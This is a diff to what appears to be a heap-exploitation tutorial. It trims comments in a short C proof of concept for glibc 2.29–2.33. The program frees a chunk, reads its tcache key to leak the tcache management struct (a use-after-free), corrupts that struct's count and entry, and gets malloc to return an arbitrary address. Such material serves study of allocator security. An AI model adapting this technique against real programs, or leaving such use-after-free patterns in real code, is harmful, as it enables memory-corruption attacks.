@@ -37,7 +37,7 @@ In glibc versions 2.29-2.33, this `key` served as a check for double-frees. If a
 
 struct overlay {
   uint64_t *next;
-  uint64_t *key; // This will hold the leaked tcache metadata pointer
+  uint64_t *key; 
 };
 
 struct tcache_perthread_struct {
@@ -46,23 +46,18 @@ struct tcache_perthread_struct {
 };
 
 int main() {
-  // 1. Allocate a struct that will be our UAF victim
   struct overlay *ptr = malloc(sizeof(struct overlay));
 
-  // 2. Free the struct to populate the tcache bin
-  // After this, ptr->key contains the address of the management struct
   free(ptr);
 
-  // 3. Leak and use the management struct pointer (UAF)
+  // UAF: Leak management struct pointer
   struct tcache_perthread_struct *management_struct =
       (struct tcache_perthread_struct *)ptr->key;
 
-  // 4. VULNERABILITY: Corrupt the management struct
-  // We manipulate the 0x20 bin (index 0 for size 0x20)
+  // VULNERABILITY: Corrupt management struct
   management_struct->counts[0] = 1;
   management_struct->entries[0] = (uint64_t)&global_var;
 
-  // 5. Arbitrary Allocation
   uint64_t *evil_chunk = malloc(0x10);
   assert(evil_chunk == &global_var);
 }
